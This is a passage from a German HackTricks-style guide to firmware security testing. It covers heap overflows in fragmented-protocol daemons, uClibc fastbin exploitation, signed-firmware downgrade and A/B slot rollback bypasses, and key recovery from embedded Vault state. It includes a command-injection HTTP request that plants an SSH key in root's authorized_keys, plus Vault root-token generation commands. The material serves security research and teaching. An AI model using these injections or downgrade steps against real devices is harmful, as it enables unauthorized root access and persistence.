3. Beim Kopieren wird `memcpy(&ctx->buffer[offset], chunk, chunk_len)` aufgerufen, ohne die **ursprünglich zugewiesene Größe** zu prüfen.

Dadurch kann ein Angreifer Folgendes senden:

- Ein erstes gültiges Fragment mit einer **kleinen** angegebenen Gesamtgröße, um eine kleine Heap-Allokation zu erzwingen.
- Ein späteres Fragment mit dem **erwarteten Offset**, aber einem größeren `chunk_len`.
- Eine gefälschte paketlokale Größe, die die erneuten Prüfungen besteht und dennoch den ursprünglich allokierten Buffer überlaufen lässt.

Wenn der verwundbare Pfad hinter der Commissioning-Logik liegt, muss der Exploit ausreichend **Geräteemulation** umfassen, um das Ziel vor dem Senden der fehlerhaften Fragmente in den erwarteten Model- oder Blob-Download-Zustand zu versetzen.

### Protokollgesteuerte `free()`-Auslöser

In eingebetteten Daemons lässt sich Heap-Metadata-Exploitation oft am einfachsten auslösen, indem man nicht auf die Bereinigung wartet, sondern die **eigene Fehlerbehandlung des Protokolls erzwingt**:<sup>[[8]](#references)</sup>

- Sende fehlerhafte Folgefragmente, um die FSM in **Retry-** oder **Error-Zustände** zu versetzen.
- Überschreite den Retry-Grenzwert, damit der Daemon den **Kontext zurücksetzt** und den beschädigten Buffer freigibt.
- Nutze diesen vorhersehbaren `free()`, um allocatorseitige Primitive auszulösen, bevor der Prozess aus anderen Gründen abstürzt.

Das ist besonders nützlich gegen **musl-/uClibc-/dlmalloc-ähnliche** Allokatoren in eingebettetem Linux, bei denen beschädigte Chunk-Metadaten die Unlink-/Unbin-Logik in ein Write-Primitive verwandeln können. Ein stabiles Muster ist, ein **Größenfeld** zu beschädigen, um die Traversierung des Allokators zu **Fake-Chunks innerhalb des übergelaufenen Buffers** umzulenken, statt sofort echte Bin-Pointer zu überschreiben und den Prozess zum Absturz zu bringen.

## Binäre Exploitation und Proof of Concept

Die Entwicklung eines PoC für erkannte Schwachstellen erfordert ein tiefes Verständnis der Zielarchitektur und Programmierkenntnisse in hardwarenahen Sprachen. Binäre Laufzeitschutzmechanismen sind in eingebetteten Systemen selten. Falls vorhanden, können jedoch Techniken wie Return Oriented Programming (ROP) erforderlich sein.

### Hinweise zur uClibc-Fastbin-Exploitation (Embedded Linux)

- **Fastbins + Konsolidierung:** uClibc verwendet Fastbins, ähnlich wie glibc. Eine spätere große Allokation kann `__malloc_consolidate()` auslösen. Daher muss jeder Fake-Chunk die Prüfungen bestehen (plausible Größe, `fd = 0` und angrenzende Chunks müssen als „in use“ erkannt werden).<sup>[[6]](#references)</sup>
- **Nicht-PIE-Binaries unter ASLR:** Ist ASLR aktiviert, aber das Hauptbinary **nicht PIE**, sind die Adressen innerhalb des Binaries in `.data/.bss` stabil. Du kannst einen Bereich anvisieren, der bereits einem gültigen Heap-Chunk-Header ähnelt, um eine Fastbin-Allokation auf einer **Funktionszeigertabelle** zu platzieren.
- **NUL-Byte zum Anhalten des Parsers:** Wird JSON geparst, kann ein `\x00` im Payload das Parsing anhalten und zugleich nachfolgende, vom Angreifer kontrollierte Bytes für einen Stack Pivot/ROP-Chain erhalten.
- **Shellcode über `/proc/self/mem`:** Eine ROP-Chain, die `open("/proc/self/mem")`, `lseek()` und `write()` aufruft, kann ausführbaren Shellcode in einem bekannten Mapping platzieren und zu ihm springen.

## Vorbereitete Betriebssysteme für Firmware-Analysen

Betriebssysteme wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) bieten vorkonfigurierte Umgebungen für Firmware-Sicherheitstests, die mit den erforderlichen Tools ausgestattet sind.

## Vorbereitete Betriebssysteme zur Firmware-Analyse

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ist eine Distribution, die Sicherheitsbewertungen und Penetrationstests von Internet-of-Things-(IoT-)Geräten unterstützt. Sie spart viel Zeit, da sie eine vorkonfigurierte Umgebung mit allen erforderlichen Tools bereitstellt.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ein auf Ubuntu 18.04 basierendes Betriebssystem für Embedded-Sicherheitstests, das bereits mit Tools für Firmware-Sicherheitstests ausgestattet ist.

## Firmware-Downgrade-Angriffe und unsichere Update-Mechanismen

Selbst wenn ein Hersteller kryptografische Signaturprüfungen für Firmware-Images implementiert, fehlt häufig der **Schutz vor Versions-Rollback (Downgrade)**. Prüft der Boot- oder Recovery-Loader lediglich die Signatur anhand eines eingebetteten öffentlichen Schlüssels, vergleicht jedoch nicht die *Version* (oder einen monoton steigenden Zähler) des zu flashenden Images, kann ein Angreifer rechtmäßig eine **ältere, verwundbare Firmware mit gültiger Signatur** installieren und so gepatchte Schwachstellen wieder einführen.<sup>[[4]](#references)</sup>

Typischer Angriffsablauf:

1. **Ein älteres, signiertes Image beschaffen**
   * Vom öffentlichen Download-Portal, CDN oder der Support-Website des Herstellers herunterladen.
   * Aus zugehörigen Mobile-/Desktop-Anwendungen extrahieren (z. B. aus `assets/firmware/` innerhalb eines Android-APK).
   * Aus Drittanbieter-Repositories wie VirusTotal, Internetarchiven, Foren usw. abrufen.
2. **Das Image über einen verfügbaren Update-Kanal auf das Gerät hochladen oder bereitstellen:**
   * Web-UI, Mobile-App-API, USB, TFTP, MQTT usw.
   * Viele Consumer-IoT-Geräte stellen *nicht authentifizierte* HTTP(S)-Endpunkte bereit, die Base64-kodierte Firmware-Blobs akzeptieren, serverseitig dekodieren und Recovery/Upgrade auslösen.
3. Nach dem Downgrade eine Schwachstelle ausnutzen, die in der neueren Version behoben wurde (zum Beispiel einen später hinzugefügten Filter gegen Command Injection).
4. Optional das neueste Image wieder flashen oder Updates deaktivieren, um nach dem Erlangen von Persistenz nicht entdeckt zu werden.

### Beispiel: Command Injection nach einem Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In der verwundbaren (downgradeten) Firmware wird der Parameter `md5` ohne Bereinigung direkt an einen Shell-Befehl angehängt. Dadurch lassen sich beliebige Befehle einschleusen – hier, um SSH-basierten Root-Zugriff zu ermöglichen. Spätere Firmware-Versionen führten einen einfachen Zeichenfilter ein. Da jedoch kein Downgrade-Schutz vorhanden ist, bleibt die Korrektur wirkungslos.<sup>[[4]](#references)</sup>

### Firmware aus mobilen Apps extrahieren

Viele Hersteller bündeln vollständige Firmware-Images in ihren zugehörigen mobilen Apps, damit die App das Gerät über Bluetooth/Wi-Fi aktualisieren kann. Diese Pakete sind häufig unverschlüsselt im APK/APEX unter Pfaden wie `assets/fw/` oder `res/raw/` gespeichert. Mit Tools wie `apktool`, `ghidra` oder sogar einfachem `unzip` lassen sich signierte Images extrahieren, ohne die physische Hardware anzufassen.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Updater-only-Umgehung des Anti-Rollback-Schutzes in A/B-Slot-Designs

Einige Hersteller implementieren zwar einen Anti-Downgrade-**Ratchet**, aber nur innerhalb der *Updater*-Logik (zum Beispiel einer UDS-Routine über CAN, eines Recovery-Befehls oder eines Userspace-OTA-Agenten). Wenn der **Bootloader** später nur die Image-Signatur/CRC prüft und der Partitionstabelle oder den Slot-Metadaten vertraut, lässt sich der Rollback-Schutz weiterhin umgehen.<sup>[[7]](#references)</sup>

Typisches schwaches Design:

- Firmware-Metadaten enthalten sowohl einen Versionsdeskriptor als auch einen **Security-Ratchet** / monotonen Zähler.
- Der Updater vergleicht den Ratchet des Images mit einem in persistentem Speicher abgelegten Wert und lehnt ältere signierte Images ab.
- Der Bootloader **wertet diesen Ratchet nicht aus** und überprüft vor dem Starten des ausgewählten Slots nur Header, CRC und Signatur.
- Die Slot-Aktivierung wird separat in einer Partitionstabelle oder einem generationsbasierten Zähler pro Slot gespeichert und ist **nicht kryptografisch an den exakten validierten Firmware-Digest gebunden**.

Dadurch entsteht in Dual-Slot-Systemen eine **Validate-one-image / boot-another-image**-Primitive. Wenn der Angreifer den Updater dazu bringen kann, Slot B mithilfe eines aktuellen signierten Images als nächstes Boot-Ziel zu markieren und Slot B anschließend vor dem Neustart zu überschreiben, startet der Bootloader möglicherweise trotzdem das Downgrade-Image, da er nur den bereits bestätigten Slot-Metadaten vertraut.

Häufiges Missbrauchsmuster:

1. Eine **aktuelle signierte** Firmware in den passiven Slot hochladen und die normale Validierungs-/Wechselroutine ausführen, sodass das Layout diesen Slot als nächsten aktiven Slot markiert.
2. **Noch nicht neu starten**. In derselben Sitzung erneut die Slot-Vorbereitungs-/Löschroutine aufrufen.
3. Veralteten Boot-Status oder veraltete Slot-Auswahllogik ausnutzen, damit der Updater **denselben physischen Slot** löscht, der gerade aktiviert wurde.
4. Eine **ältere, aber weiterhin signierte** Firmware in diesen Slot schreiben.
5. Die Validierungsroutine umgehen, die den Ratchet durchsetzt, und direkt neu starten.
6. Der Bootloader wählt den aktivierten Slot aus, prüft nur Signatur/Integrität und startet das alte Image.

Worauf du beim Reverse Engineering von A/B-Update-Implementierungen achten solltest:

- Slot-Auswahl anhand von **Boot-Zeit-Flags**, die nach einem erfolgreichen Wechsel nicht aktualisiert werden.
- Eine Routine im Stil von `prepare_passive_slot()`, die einen Slot anhand veralteten Status statt des **aktuell bestätigten Layouts** löscht.
- Eine Funktion im Stil von `part_write_layout()`, die nur einen **Generation Counter** / ein Aktiv-Flag erhöht und nicht den Hash des validierten Images speichert.
- Ratchet-Prüfungen, die im Userspace oder im Updater-Code implementiert sind, aber **nicht in ROM / Bootloader / Secure-Boot-Stufen**.
- Lösch- oder Recovery-Routinen, die den Slot weiterhin als bootfähig markieren, obwohl sein Inhalt entfernt und neu geschrieben wurde.

### Checkliste zur Bewertung der Update-Logik

* Ist der Transport/die Authentifizierung des *Update-Endpunkts* ausreichend geschützt (TLS + Authentifizierung)?
* Vergleicht das Gerät vor dem Flashen **Versionsnummern** oder einen **monotonen Anti-Rollback-Zähler**?
* Wird das Image innerhalb einer Secure-Boot-Kette verifiziert (z. B. Signaturprüfung durch ROM-Code)?
* Setzt der **Bootloader denselben Ratchet wie der Updater durch**, statt nur Signatur/CRC zu prüfen?
* Sind die Slot-Aktivierungsmetadaten **an den validierten Firmware-Digest/die Version gebunden**, oder kann ein Slot nach seiner Aktivierung geändert werden?
* Wird das Gerät nach einem erfolgreichen Slot-Wechsel zu einem Neustart gezwungen, oder sind weitere Update-/Löschroutinen in derselben Sitzung noch erreichbar?
* Führt Userland-Code zusätzliche Plausibilitätsprüfungen durch (z. B. zulässige Partitionstabelle, Modellnummer)?
* Verwenden *partielle* oder *Backup*-Update-Abläufe dieselbe Validierungslogik?

> 💡  Wenn eines der oben genannten Elemente fehlt, ist die Plattform wahrscheinlich anfällig für Rollback-Angriffe.

## Verwundbare Firmware zum Üben

Um das Auffinden von Schwachstellen in Firmware zu üben, kannst du mit den folgenden verwundbaren Firmware-Projekten beginnen.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Wiederherstellen von Firmware-Entschlüsselungsschlüsseln aus eingebettetem KMS-/Vault-Status

Wenn ein Update-Image kleine Klartext-Metadaten mit einem großen Blob hoher Entropie kombiniert, solltest du zuerst den Container untersuchen, bevor du irgendetwas per Brute-Force ausprobierst:<sup>[[1]](#references)</sup>

- Header, Offsets und Zeilengrenzen mit `hexdump`, `xxd`, `strings -tx`, `base64 -d` und `binwalk -E` ausgeben.
- `Salted__` deutet meist auf das OpenSSL-`enc`-Format hin: Die nächsten 8 Bytes sind der Salt, die verbleibenden Bytes der Ciphertext.
- Ein Base64-Feld, das zu genau `256` Bytes dekodiert wird, ist ein deutlicher Hinweis auf einen RSA-2048-Ciphertext, der ein zufälliges Firmware-Passwort/einen Session-Key verschlüsselt.
- Abgetrenntes PGP-Material in derselben Datei schützt häufig nur die Authentizität; gehe nicht davon aus, dass es der Vertraulichkeitsschutz ist.

Wenn die statische Suche nach Schlüsseln (`grep`, `strings`, PEM-/PGP-Suchen) erfolglos bleibt, untersuche stattdessen den **operativen Entschlüsselungspfad**, anstatt nur nach privaten Schlüsseln zu suchen:

- Decompile den Updater/die Management-Binärdatei und verfolge, wer den verschlüsselten Blob liest, welcher Helper/welche API ihn entschlüsselt und welchen logischen Schlüsselnamen er anfordert.
- Durchsuche das extrahierte Root-Dateisystem nach KMS-Status (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) sowie Unit-Dateien und Init-Skripten.
- Behandle Klartextbefehle wie `vault operator unseal ...`, Recovery-Schlüssel, Bootstrap-Tokens oder lokale KMS-Auto-Unseal-Skripte wie Material für private Schlüssel.

Wenn das Gerät die originale Vault-Binärdatei und das Storage-Backend enthält, ist es normalerweise einfacher, diese Umgebung nachzubilden, als Vault-Interna neu zu implementieren:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Mit root auf dem geklonten KMS:

- Transit-Schlüssel nur innerhalb des isolierten Klons exportierbar machen: `vault write transit/keys/<name>/config exportable=true`
- Den Unwrap-Schlüssel exportieren: `vault read transit/export/encryption-key/<name>`
- Den wiederhergestellten RSA-Schlüssel mit genau dem Padding-/Hash-Paar testen, das vom KMS verwendet wird. Eine fehlgeschlagene PKCS#1-v1.5-Entschlüsselung und eine fehlgeschlagene standardmäßige OAEP-Entschlüsselung beweisen **nicht**, dass der Schlüssel falsch ist; viele von Vault unterstützte Abläufe verwenden OAEP mit SHA-256, während gängige Bibliotheken standardmäßig SHA-1 nutzen.
- Beginnt die Payload mit `Salted__`, den OpenSSL-KDF des Herstellers exakt nachbilden (`EVP_BytesToKey`, auf älteren Appliances oft MD5), bevor du eine AES-CBC-Entschlüsselung versuchst.

Damit wird aus „verschlüsselter Firmware“ ein allgemeineres Problem: **die operativen Schlüssel auf der Appliance wiederherstellen und anschließend die exakten Unwrap- und KDF-Parameter offline nachbilden**.

## Schulungen und Zertifizierungen

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Firmware mit Claude knacken: Fähigkeiten auf Senior-Level, Autonomie auf Junior-Level](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Methodik für Firmware-Sicherheitstests](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktisches IoT-Hacking: Der maßgebliche Leitfaden zum Angriff auf das Internet der Dinge](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Zero-Days in verlassener Hardware ausnutzen – Trail-of-Bits-Blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Wie mir ein 20-Dollar-Smartgerät Zugriff auf dein Zuhause verschaffte](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Jetzt siehst du mi: Jetzt bist du Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv – Den Tesla Wall Connector über dessen Ladeanschluss ausnutzen – Teil 2: Umgehung des Anti-Downgrades](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Bring es zum Blinken: Over-the-Air-Exploitation der Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [Tesla OS auf QEMU rooten, Teil 2: Debuggen und Reparieren](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [10] [Dell-BIOS-Passwörter: Schwache XOR-Verschlüsselung ermöglicht Wiederherstellung aus dem SPI-Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [11] [R3n5k1/dellpwn – Tool zur Wiederherstellung von Dell-BIOS-Passwörtern](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
